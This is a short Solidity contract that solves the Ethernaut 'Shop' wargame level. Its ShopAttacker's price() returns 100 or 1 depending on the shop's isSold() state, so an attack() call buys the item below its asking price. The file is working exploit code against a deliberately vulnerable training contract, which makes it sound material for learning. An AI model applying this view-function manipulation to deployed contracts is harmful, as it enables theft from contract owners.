// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./ethernaut/Shop.sol";

contract ShopAttacker is Buyer {
    function price() external view override returns (uint) {
        return Shop(msg.sender).isSold() ? 1 : 100;
    }

    function attack(Shop _victim) external {
        Shop(_victim).buy();
    }
}